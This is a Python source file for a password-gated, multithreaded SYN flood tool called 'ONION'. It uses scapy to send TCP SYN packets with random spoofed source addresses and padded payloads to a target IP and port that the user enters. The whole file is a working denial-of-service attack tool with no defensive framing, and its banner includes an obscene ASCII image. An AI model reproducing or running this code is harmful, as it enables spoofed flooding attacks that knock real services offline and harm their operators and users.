# -*- coding: utf-8 -*-

from scapy.all import RandShort, Raw, send, RandIP
from scapy.layers.inet import IP, TCP
from time import sleep
from random import randint
from time import sleep
from os import system
from hashlib import sha256
from getpass import getpass
from threading import Thread


def clear():
    system('clear' or 'cls')

def fulogo():
    clear()
    print(color.YEL+'''


            _         FUCK YOU        _
           |_|                       |_|
           | |         /^^^\\         | |
          _| |_      (| "o" |)      _| |_
        _| | | | _    (_---_)    _ | | | |_
       | | | | |' |    _| |_    | `| | | | |
       |          |   /     \\   |          |
        \\        /  / /(. .)\\ \\  \\        /
          \\    /  / /  | . |  \\ \\  \\    /
            \\  \\/ /    ||Y||    \\ \\/  /
             \\__/      || ||      \\__/
                       () ()
                       || ||
                      ooO Ooo        

    ''')   #this unnormal bot ok!
    sleep(100)



class color : 
    GREEN = '\033[92m'
    RED = '\033[91m'
    YEL = '\033[93m'




def logo() :
    clear()
    print(color.RED+"""
\n
 ▒█████   ███▄    █  ██▓ ▒█████   ███▄    █ 
▒██▒  ██▒ ██ ▀█   █ ▓██▒▒██▒  ██▒ ██ ▀█   █ 
▒██░  ██▒▓██  ▀█ ██▒▒██▒▒██░  ██▒▓██  ▀█ ██▒
▒██   ██░▓██▒  ▐▌██▒░██░▒██   ██░▓██▒  ▐▌██▒
░ ████▓▒░▒██░   ▓██░░██░░ ████▓▒░▒██░   ▓██░     
░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒   IP SP
  ░ ▒ ▒░ ░ ░░   ░ ▒░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░  V:0.1.1
░ ░ ░ ▒     ░   ░ ░  ▒ ░░ ░ ░ ▒     ░   ░ ░ 
    ░ ░           ░  ░      ░ ░ </OƝioN

"""+color.GREEN)


def START():
    print("code by </OƝion")
    sleep(.5)
    target_ip = str(input('[>] Target ip:'))
    target_port = int(input('[>] Target port:'))
    count = int(input('[>] packet count:'))
    sleeptime = float(input('[>] delay [.001-.01]:'))
    tread_count = int(input('[>] tread:'))
    minimum_size = int(input('[>] minimum packet size:'))
    maximum_size = int(input('[>] maximum packet size:'))
    count_packet_tread = int(count / tread_count)
    #sended = 1
    def tread_def(target_ip, target_port, count_packet_tread, sleeptime, maximum_size, minimum_size):
        #global sended
        for _ in range(count_packet_tread):
            sleep(sleeptime)
            fake_ip = RandIP()
            s_eq = randint(1000, 9000)
            w_indow = randint(1100, 9000)
            ip = IP(src=fake_ip, dst=target_ip)
            tcp = TCP(sport=RandShort(), dport=target_port, flags="S", seq=s_eq, window=w_indow)
            size = Raw(b"M" * randint(minimum_size,maximum_size))
            packet = ip / tcp / size
            send(packet , verbose=False)
            #print(f'\n\n[+] started :\nTarget IP: {target_ip} \nTarget PORT: {target_port} \nCount: {sended} \nDelay: {sleeptime}')
            #sended += 1
            


    for _ in range(tread_count):

        try:
            x = Thread(target=tread_def, args=(target_ip, target_port, count_packet_tread, sleeptime, maximum_size, minimum_size))
            x.start()
            sleep(.5)
        except:
            print('[error!] run by sudo ...')

    print(f'\n\n[+] DONE:\nTarget IP: {target_ip} \nTarget PORT: {target_port} \nCount: {count} \nDelay: {sleeptime}\nPacket size:{minimum_size}/{maximum_size}')
        




if __name__ == "__main__":
    pasworld_try = 0
    logo()
    #Take a string and convert it to sha256
    
    while True:
        pasworld_try = pasworld_try + 1
        pwd = str(getpass("[ ] app pasworld:"))
        pw = 'c6aa11096128178b41f4de7ed933dc4f2b36ece01022fe79bd4a3dcb892dd99f'
        pwdh = sha256(pwd.encode('utf-8')).hexdigest()
        if pwdh == pw :
            logo()
            START()
            input("Press ENTER to EXIT")
            break
            
        elif pasworld_try >= 2 and pasworld_try <= 3:
            logo()
            print("Wrong password.. \n")

        elif pasworld_try >= 4:
            clear()
            fulogo()
            print("Wrong password... \nCtrl C  to EXIT")
            break

        else:
            logo()
            print("Wrong password")
